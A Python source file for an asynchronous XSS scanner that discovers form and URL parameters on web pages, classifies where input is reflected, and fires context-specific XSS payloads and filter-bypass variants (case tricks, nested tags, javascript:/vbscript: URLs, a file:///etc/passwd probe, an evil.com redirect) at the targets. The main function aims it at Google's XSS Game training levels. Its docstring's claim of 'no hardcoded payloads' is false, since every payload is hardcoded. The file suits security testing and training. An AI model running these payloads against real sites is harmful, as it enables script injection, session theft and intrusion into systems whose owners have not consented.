#!/usr/bin/env python3
"""
Adaptive XSS Scanner - Dynamically generates payloads based on context analysis
No hardcoded payloads - adapts to any target through intelligent analysis
"""
import asyncio
import aiohttp
import json
import re
import urllib.parse
import time
from bs4 import BeautifulSoup, Comment

class ContextAnalyzer:
    """Analyzes injection context and generates appropriate payloads"""
    
    def __init__(self):
        self.injection_contexts = {
            'html_content': self._generate_html_payloads,
            'attribute_value': self._generate_attribute_payloads,
            'javascript_string': self._generate_js_string_payloads,
            'javascript_context': self._generate_js_context_payloads,
            'url_parameter': self._generate_url_payloads,
            'css_context': self._generate_css_payloads
        }
    
    def analyze_injection_point(self, original_response, test_payload, injected_response):
        """Determine where and how the payload was injected"""
        contexts = []
        
        # Find where test_payload appears in the response
        soup = BeautifulSoup(injected_response, 'html.parser')
        
        # Check HTML content injection
        if test_payload in injected_response:
            # Find the exact location context
            context_info = self._find_injection_context(injected_response, test_payload)
            contexts.extend(context_info)
        
        return contexts
    
    def _find_injection_context(self, response, payload):
        """Find specific injection contexts in the response"""
        contexts = []
        
        # Parse with BeautifulSoup to understand structure
        soup = BeautifulSoup(response, 'html.parser')
        
        # Search for payload in different contexts
        for element in soup.find_all(string=re.compile(re.escape(payload))):
            parent = element.parent
            
            if parent.name == 'script':
                # JavaScript context
                js_content = str(element)
                if f"'{payload}'" in js_content or f'"{payload}"' in js_content:
                    contexts.append({
                        'type': 'javascript_string',
                        'quote_type': "'" if f"'{payload}'" in js_content else '"',
                        'surrounding': js_content
                    })
                else:
                    contexts.append({
                        'type': 'javascript_context',
                        'surrounding': js_content
                    })
            
            elif parent.get('onclick') or parent.get('onerror') or any(attr.startswith('on') for attr in parent.attrs):
                # Event handler context
                contexts.append({
                    'type': 'javascript_context',
                    'event_handler': True,
                    'element': parent.name
                })
                
            else:
                # HTML content context
                contexts.append({
                    'type': 'html_content',
                    'element': parent.name,
                    'surrounding': str(element)
                })
        
        # Check for attribute injection
        for tag in soup.find_all():
            for attr_name, attr_value in tag.attrs.items():
                if isinstance(attr_value, str) and payload in attr_value:
                    contexts.append({
                        'type': 'attribute_value',
                        'attribute': attr_name,
                        'element': tag.name,
                        'full_value': attr_value,
                        'quote_context': self._determine_quote_context(response, attr_value)
                    })
        
        return contexts
    
    def _determine_quote_context(self, response, attr_value):
        """Determine if attribute is quoted with ' or \" """
        if f'="{attr_value}"' in response:
            return 'double_quote'
        elif f"='{attr_value}'" in response:
            return 'single_quote'
        else:
            return 'unquoted'
    
    def generate_payloads_for_context(self, context):
        """Generate payloads based on injection context"""
        context_type = context['type']
        if context_type in self.injection_contexts:
            return self.injection_contexts[context_type](context)
        return []
    
    def _generate_html_payloads(self, context):
        """Generate payloads for HTML content injection"""
        payloads = []
        
        # Try different XSS vectors
        vectors = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>',
            '<details ontoggle=alert(1) open>',
            '<marquee onstart=alert(1)>'
        ]
        
        # If we're inside a specific element, try context-specific payloads
        if 'element' in context:
            element = context['element']
            if element in ['div', 'p', 'span']:
                # Try breaking out of content context
                payloads.extend([
                    f'</span><script>alert(1)</script><span>',
                    f'</{element}><script>alert(1)</script><{element}>'
                ])
        
        payloads.extend(vectors)
        return payloads
    
    def _generate_attribute_payloads(self, context):
        """Generate payloads for attribute value injection"""
        payloads = []
        attr = context['attribute']
        quote_context = context['quote_context']
        
        if quote_context == 'double_quote':
            # Break out of double quotes
            payloads.extend([
                '" onmouseover="alert(1)" x="',
                '" onclick="alert(1)" x="',
                '" onerror="alert(1)" x="',
                '"><script>alert(1)</script><x x="',
                '"><img src=x onerror=alert(1)><x x="'
            ])
        elif quote_context == 'single_quote':
            # Break out of single quotes
            payloads.extend([
                "' onmouseover='alert(1)' x='",
                "' onclick='alert(1)' x='",
                "' onerror='alert(1)' x='",
                "'><script>alert(1)</script><x x='",
                "'><img src=x onerror=alert(1)><x x='"
            ])
        else:
            # Unquoted context
            payloads.extend([
                ' onmouseover=alert(1) x=',
                ' onclick=alert(1) x=',
                '><script>alert(1)</script><x x='
            ])
        
        # URL-specific payloads for href, src, action attributes
        if attr in ['href', 'src', 'action']:
            payloads.extend([
                'javascript:alert(1)',
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)'
            ])
        
        return payloads
    
    def _generate_js_string_payloads(self, context):
        """Generate payloads for JavaScript string context"""
        payloads = []
        quote_type = context.get('quote_type', '"')
        
        if quote_type == '"':
            payloads.extend([
                '";alert(1);//',
                '";alert(1);x="',
                '"*alert(1)*"',
                '"+alert(1)+"'
            ])
        else:
            payloads.extend([
                "';alert(1);//",
                "';alert(1);x='",
                "'*alert(1)*'",
                "'+alert(1)+'"
            ])
        
        return payloads
    
    def _generate_js_context_payloads(self, context):
        """Generate payloads for JavaScript execution context"""
        payloads = [
            'alert(1)',
            'alert(String.fromCharCode(49))',
            'eval("alert(1)")',
            'Function("alert(1)")()',
            'setTimeout("alert(1)",0)',
            '[].constructor.constructor("alert(1)")()'
        ]
        return payloads
    
    def _generate_url_payloads(self, context):
        """Generate payloads for URL parameter injection"""
        payloads = [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'file:///etc/passwd',
            '//evil.com/xss',
            'http://evil.com/xss'
        ]
        return payloads
    
    def _generate_css_payloads(self, context):
        """Generate payloads for CSS injection"""
        payloads = [
            'expression(alert(1))',
            'url(javascript:alert(1))',
            'url("javascript:alert(1)")',
            '}body{background:url("javascript:alert(1)")}/*'
        ]
        return payloads

class FilterAnalyzer:
    """Analyzes filtering mechanisms and generates bypasses"""
    
    def analyze_filtering(self, original_payload, response):
        """Determine what filtering is happening"""
        filters_detected = []
        
        if '<script>' in original_payload and '<script>' not in response:
            filters_detected.append('script_tag_filter')
        
        if 'javascript:' in original_payload and 'javascript:' not in response:
            filters_detected.append('javascript_protocol_filter')
        
        if original_payload != response and len(response) < len(original_payload):
            filters_detected.append('length_based_filter')
        
        return filters_detected
    
    def generate_bypass_payloads(self, original_payload, filters):
        """Generate payloads to bypass detected filters"""
        bypass_payloads = []
        
        if 'script_tag_filter' in filters:
            bypass_payloads.extend([
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<ScRiPt>alert(1)</ScRiPt>',  # Case variation
                '<script/>alert(1)</script>',  # Self-closing bypass
                '<<script>script>alert(1)<</script>/script>'  # Double tag
            ])
        
        if 'javascript_protocol_filter' in filters:
            bypass_payloads.extend([
                'JAVASCRIPT:alert(1)',  # Case bypass
                'javascript://alert(1)',  # Comment bypass
                'data:text/html,<script>alert(1)</script>',
                'vbscript:alert(1)'
            ])
        
        return bypass_payloads

class AdaptiveXSSScanner:
    """Main scanner that adapts to any target"""
    
    def __init__(self):
        self.context_analyzer = ContextAnalyzer()
        self.filter_analyzer = FilterAnalyzer()
        self.findings = []
    
    async def scan_parameter(self, session, base_url, param_name):
        """Scan a single parameter with adaptive payload generation"""
        print(f"🎯 Scanning parameter: {param_name}")
        
        # Step 1: Baseline request
        baseline_response = await self._get_baseline_response(session, base_url)
        
        # Step 2: Test with marker payload to find injection point
        marker_payload = f"XSS_TEST_{int(time.time())}"
        test_url = f"{base_url}?{param_name}={urllib.parse.quote(marker_payload)}"
        
        try:
            async with session.get(test_url, timeout=10) as resp:
                test_response = await resp.text()
                
                if marker_payload in test_response:
                    print(f"✅ Parameter {param_name} reflects input")
                    
                    # Step 3: Analyze injection context
                    contexts = self.context_analyzer.analyze_injection_point(
                        baseline_response, marker_payload, test_response
                    )
                    
                    print(f"📊 Found {len(contexts)} injection contexts")
                    
                    # Step 4: Generate and test context-specific payloads
                    for context in contexts:
                        await self._test_context_payloads(session, base_url, param_name, context)
                
                else:
                    print(f"❌ Parameter {param_name} doesn't reflect input")
                    
        except Exception as e:
            print(f"❌ Error testing parameter {param_name}: {e}")
    
    async def _get_baseline_response(self, session, url):
        """Get baseline response for comparison"""
        try:
            async with session.get(url, timeout=10) as resp:
                return await resp.text()
        except:
            return ""
    
    async def _test_context_payloads(self, session, base_url, param_name, context):
        """Test payloads generated for specific context"""
        print(f"🔍 Testing context: {context['type']}")
        
        # Generate payloads for this context
        payloads = self.context_analyzer.generate_payloads_for_context(context)
        
        for payload in payloads[:5]:  # Test first 5 payloads to avoid rate limiting
            test_url = f"{base_url}?{param_name}={urllib.parse.quote(payload)}"
            
            try:
                async with session.get(test_url, timeout=10) as resp:
                    response_text = await resp.text()
                    
                    # Check if payload was filtered
                    filters = self.filter_analyzer.analyze_filtering(payload, response_text)
                    
                    if filters:
                        print(f"🚫 Payload blocked by filters: {filters}")
                        # Generate bypass payloads
                        bypass_payloads = self.filter_analyzer.generate_bypass_payloads(payload, filters)
                        await self._test_bypass_payloads(session, base_url, param_name, bypass_payloads)
                    
                    elif self._detect_xss_success(payload, response_text, context):
                        print(f"🎉 XSS SUCCESS: {payload}")
                        self._add_finding(
                            f"Adaptive XSS ({context['type']})", 
                            payload, 
                            test_url,
                            f"Context-specific XSS in {context['type']}: {payload}",
                            0.90
                        )
                        return  # Found working XSS, stop testing this context
                    
            except Exception as e:
                print(f"❌ Error testing payload: {e}")
    
    async def _test_bypass_payloads(self, session, base_url, param_name, bypass_payloads):
        """Test bypass payloads"""
        for bypass_payload in bypass_payloads[:3]:  # Test first 3 bypass attempts
            test_url = f"{base_url}?{param_name}={urllib.parse.quote(bypass_payload)}"
            
            try:
                async with session.get(test_url, timeout=10) as resp:
                    response_text = await resp.text()
                    
                    if self._detect_xss_success(bypass_payload, response_text, {'type': 'filter_bypass'}):
                        print(f"🎉 BYPASS SUCCESS: {bypass_payload}")
                        self._add_finding(
                            "Filter Bypass XSS", 
                            bypass_payload, 
                            test_url,
                            f"Filter bypass XSS: {bypass_payload}",
                            0.95
                        )
                        return
                        
            except Exception as e:
                continue
    
    def _detect_xss_success(self, payload, response, context):
        """Detect if XSS payload was successful"""
        # This is where we'd normally check if JavaScript executed
        # For now, check if dangerous payload is reflected without encoding
        
        dangerous_patterns = [
            'onerror=',
            'onload=',
            'onclick=',
            'javascript:',
            '<script>',
            'alert(',
            'eval(',
            'expression('
        ]
        
        return any(pattern in response for pattern in dangerous_patterns if pattern in payload)
    
    def _add_finding(self, attack_type, payload, url, evidence, confidence):
        """Add finding to results"""
        finding = {
            "attack_type": attack_type,
            "payload": payload,
            "url": url,
            "evidence": evidence,
            "confidence": confidence,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        self.findings.append(finding)
    
    async def scan_url(self, session, url):
        """Scan URL with adaptive parameter discovery and testing"""
        print(f"🎯 Adaptive scan: {url}")
        
        # Discover parameters through various methods
        discovered_params = await self._discover_parameters(session, url)
        print(f"📊 Discovered parameters: {discovered_params}")
        
        # Test each parameter adaptively
        for param in discovered_params:
            await self.scan_parameter(session, url, param)
            print("-" * 30)
    
    async def _discover_parameters(self, session, url):
        """Discover parameters through multiple methods"""
        params = set()
        
        # Method 1: Analyze page source for forms and JavaScript
        try:
            async with session.get(url, timeout=10) as resp:
                html = await resp.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                # Find form parameters
                for form in soup.find_all('form'):
                    for input_elem in form.find_all(['input', 'textarea', 'select']):
                        name = input_elem.get('name')
                        if name:
                            params.add(name)
                
                # Find URL parameters in JavaScript and links
                js_param_pattern = r'[?&](\w+)='
                for match in re.finditer(js_param_pattern, html):
                    params.add(match.group(1))
                    
        except:
            pass
        
        # Method 2: Common parameter names based on page analysis
        if 'search' in url or 'query' in html.lower():
            params.update(['q', 'query', 'search', 'term'])
        
        if 'chat' in html.lower() or 'message' in html.lower():
            params.update(['message', 'content', 'text', 'msg'])
        
        if 'timer' in html.lower() or 'timeout' in html.lower():
            params.update(['timer', 'timeout', 'delay', 'seconds'])
        
        if 'signup' in html.lower() or 'redirect' in html.lower():
            params.update(['next', 'redirect', 'continue', 'return'])
        
        # Default fallback parameters if none found
        if not params:
            params.update(['id', 'page', 'action', 'cmd'])
        
        return list(params)

async def main():
    scanner = AdaptiveXSSScanner()
    
    # Test URLs - will work on any target, not just XSS Game
    test_urls = [
        "https://xss-game.appspot.com/level1/frame",
        "https://xss-game.appspot.com/level2/frame",
        "https://xss-game.appspot.com/level3/frame",
        "https://xss-game.appspot.com/level4/frame",
        "https://xss-game.appspot.com/level5/frame",
        "https://xss-game.appspot.com/level6/frame"
    ]
    
    print("🧠 Adaptive XSS Scanner - No Hardcoded Payloads")
    print("=" * 60)
    
    async with aiohttp.ClientSession() as session:
        for url in test_urls:
            await scanner.scan_url(session, url)
            print("=" * 60)
    
    # Results
    print(f"\n🎯 ADAPTIVE SCANNER RESULTS:")
    print(f"Total findings: {len(scanner.findings)}")
    
    for finding in scanner.findings:
        print(f"✅ {finding['attack_type']}")
        print(f"   Payload: {finding['payload']}")
        print(f"   Evidence: {finding['evidence']}")
        print()
    
    # Save results
    with open("adaptive_results.jsonl", "w") as f:
        for finding in scanner.findings:
            f.write(json.dumps(finding) + "\n")
    
    print(f"💾 Results saved to adaptive_results.jsonl")

if __name__ == "__main__":
    asyncio.run(main())